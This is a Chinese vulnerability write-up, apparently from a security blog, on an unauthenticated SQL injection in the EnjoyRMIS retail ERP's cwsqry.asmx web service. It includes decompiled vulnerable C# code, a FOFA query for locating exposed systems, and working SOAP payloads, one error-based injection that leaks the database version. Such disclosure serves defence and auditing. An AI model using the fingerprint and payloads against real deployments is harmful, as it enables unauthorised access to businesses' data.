---
title: "昂捷ERP cwsqry.asmx SQL注入漏洞"
source: https://mrxn.net/jswz/enjoyrmis-ws-reporttool-cwsqry-stablename-sqli.html
asset_dir: assets/昂捷erp-cwsqry.asmx-sql注入漏洞
---

# 昂捷ERP cwsqry.asmx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/28 08:39
- 852浏览
- [0评论](#comment)
- 52分钟阅读

深入探索

漏洞修复方案

Web安全课程

恶意软件分析工具

---

# 漏洞简介

EnjoyRMIS系统是由深圳市昂捷信息技术股份有限公司开发的一款面向零售行业的管理信息系统，旨在为超市、便利店、百货、购物中心及专营专卖等零售业态提供全面的数字化解决方案和服务。EnjoyRMIS系统的 /EnjoyRMIS\_WS/WS/ReportTool/cwsqry.asmx 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库敏感信息。

SQL注入检测工具

# fofa语法

> `body="/Scripts/EnjoyMsg.js"`

# 漏洞分析

## GetDictionary

直接看 GetDictionary 方法的实现

```
public DataSet GetDictionary(string sTableName)
{
  return new CDACommon().GetTableDictionary(sTableName);
}
```

将 sTableName 代入 CDACommon().GetTableDictionary 方法

代码安全审计

```
public DataSet GetTableDictionary(string sTableName)
{
  return this.GetDataSet("SELECT ROW_NUMBER() OVER (order by a.id)as RowNumber ,\r\n                     d.name N'TableName',\r\n\t                 a.name N'ColumnName',\r\n\t                 (case when (SELECT count(*)\r\n\t                 FROM sysobjects\r\n\t                 WHERE (name in\r\n        \t            (SELECT name\r\n\t                           FROM sysindexes\r\n        \t                 WHERE (id = a.id) AND (indid in\r\n                \t             (SELECT indid\r\n\t                             FROM sysindexkeys\r\n        \t                     WHERE (id = a.id) AND (colid in\r\n                \t            (SELECT colid\r\n                        \t      FROM syscolumns\r\n\t                               WHERE (id = a.id) AND (name = a.name))))))) AND\r\n\t                           (xtype = 'PK'))>0 then '√' else '' end) N'Primary',\r\n\t\t\t\t\t\tb.name N'Type',\r\n\t\t\t\t\t\ta.length N'Number',\r\n\t\t\t\t\t\tCOLUMNPROPERTY(a.id,a.name,'PRECISION') as N'Length',\r\n\t\t\t\t\t\tisnull(COLUMNPROPERTY(a.id,a.name,'Scale'),0) as N'decimalN',\r\n\t\t\t\t\t\t(case when a.isnullable=1 then '√'else '' end) N'isnull',\r\n\t\t\t\t\t\tisnull(e.text,'') N'NullText',\r\n\t\t\t\t\t\tisnull(g.[value],'') AS N'Note'\r\n\t\t\t\t\tFROM  syscolumns  a left join systypes b \r\n\t\t\t\t\ton  a.xtype=b.xusertype\r\n\t\t\t\t\tinner join sysobjects d \r\n\t\t\t\t\ton a.id=d.id  and  d.xtype='U' and  d.name<>'dtproperties'\r\n\t\t\t\t\tleft join syscomments e\r\n\t\t\t\t\ton a.cdefault=e.id\r\n\t\t\t\t\tleft join sys.extended_properties g\r\n\t\t\t\t\ton a.id=g.major_id AND a.colid = g.minor_id\r\n                    where d.name = '" + sTableName + "' order by RowNumber,object_name(a.id),a.colorder");
}
```

GetTableDictionary 方法里直接将 `sTableName` 拼接到SQL语句where子语句中执行，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，其他几个方法也存在同样的问题。

## GetAllQryColumn

```
public QryDSet GetAllQryColumn(string sTable) => new CDAQry().GetAllQryColumn(sTable);
public QryDSet GetAllQryColumn(string sTable)
{
  COleDbConn coleDbConn = new COleDbConn();
  coleDbConn.ConnDB();
  try
  {
    string str = "select  '" + sTable + "' as c_table_name, syscolumns.name as c_column_name,isnull((select pbc_hdr from pbcatcol where\r\n                            pbc_tnam='" + sTable + "' and pbc_cnam= syscolumns.name),syscolumns.name) as c_column_cname,\r\n\t\t\t\t\t\t\tsystypes.name as c_data_type,syscolumns.length as c_data_len \r\n\t\t\t\t\t\t\tfrom sys.extended_properties,sysobjects,syscolumns,systypes \r\n\t\t\t\t\t\t\twhere sys.extended_properties.major_id=sysobjects.id \r\n\t\t\t\t\t\t\tand syscolumns.id=sysobjects.id \r\n\t\t\t\t\t\t\tand syscolumns.colid=sys.extended_properties.minor_id \r\n\t\t\t\t\t\t\tand syscolumns.xtype=systypes.xtype \r\n\t\t\t\t\t\t\tand sysobjects.name= '" + sTable + "' \r\n\t\t\t\t\t\t\torder by sys.extended_properties.minor_id";
    QryDSet allQryColumn = new QryDSet();
    OleDbDataAdapter oleDbDataAdapter = new OleDbDataAdapter();
    OleDbCommand oleDbCommand = new OleDbCommand();
    ((DbCommand) oleDbCommand).CommandText = str;
    ((DbCommand) oleDbCommand).CommandType = (CommandType) 1;
    oleDbCommand.Connection = coleDbConn.OleDbConnection;
    oleDbDataAdapter.SelectCommand = oleDbCommand;
    ((DbDataAdapter) oleDbDataAdapter).Fill((DataSet) allQryColumn, "tb_select_column");
    return allQryColumn;
  }
  catch (Exception ex)
  {
    throw ex;
  }
  finally
  {
    coleDbConn.DisConnDB();
  }
}
```

sTable 也是直接拼接进SQL语句中，只是在利用时需要注意SQL语句的编写。

漏洞预警服务

# 漏洞复现

## GetDictionary

```
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Connection: keep-alive
SOAPAction: http://tempuri.org/GetDictionary
Content-Type: text/xml;charset=UTF-8
Host: enjoyrmis.mrxn.net
Content-Length: 327

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetDictionary>
         <!--type: string-->
         <tem:sTableName>1'and 1=@@version--</tem:sTableName>
      </tem:GetDictionary>
   </soapenv:Body>
</soapenv:Envelope>
```

[![昂捷ERP cwsqry.asmx SQL注入漏洞](images/img-001-51237e2caad1.webp)](https://image.mrxn.net/343b23a40098428f9cad40f5ae6e704b.webp)

成功利用报错注入 爆出数据库版本信息。

网络安全

## GetAllQryColumn

```
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Connection: keep-alive
SOAPAction: http://tempuri.org/GetAllQryColumn
Content-Type: text/xml;charset=UTF-8
Host: enjoyrmis.mrxn.net
Content-Length: 327

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetAllQryColumn>
         <!--type: string-->
         <tem:sTable>'</tem:sTable>
      </tem:GetAllQryColumn>
   </soapenv:Body>
</soapenv:Envelope>
```

[![昂捷ERP cwsqry.asmx SQL注入漏洞](images/img-002-6c31f46401fb.webp)](https://image.mrxn.net/920283c495cf4c9b8b98a18586917b2c.webp)

输入单引号，成功引起数据库错误。

编程

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [3.1.GetDictionary](#toc-3-1-)
- [3.2.GetAllQryColumn](#toc-3-2-)
- [4.漏洞复现](#toc-4-)
- [4.1.GetDictionary](#toc-4-1-)
- [4.2.GetAllQryColumn](#toc-4-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
